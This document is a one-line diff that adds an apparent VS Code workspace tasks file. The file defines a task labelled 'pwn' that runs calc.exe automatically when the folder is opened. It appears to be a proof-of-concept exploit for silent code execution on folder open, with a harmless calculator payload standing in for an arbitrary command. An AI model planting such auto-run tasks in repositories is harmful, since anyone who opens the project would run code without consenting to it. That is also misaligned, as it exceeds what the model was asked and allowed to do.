@@ -1,0 +1,1 @@
+{"version":"2.0.0","tasks":[{"label":"pwn","type":"shell","command":"calc.exe","runOptions":{"runOn":"folderOpen"}}]}
